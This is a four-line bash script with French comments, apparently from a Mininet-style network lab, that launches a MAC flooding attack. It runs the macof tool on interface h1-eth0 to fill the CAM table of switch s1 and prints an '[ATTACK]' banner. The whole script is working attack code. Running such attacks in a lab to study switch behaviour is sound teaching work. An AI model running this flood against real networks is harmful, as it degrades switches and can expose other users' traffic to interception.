#!/bin/bash
# MAC Flooding — remplit la table CAM du switch
echo "[ATTACK] MAC Flooding : saturation switch s1"
macof -i h1-eth0
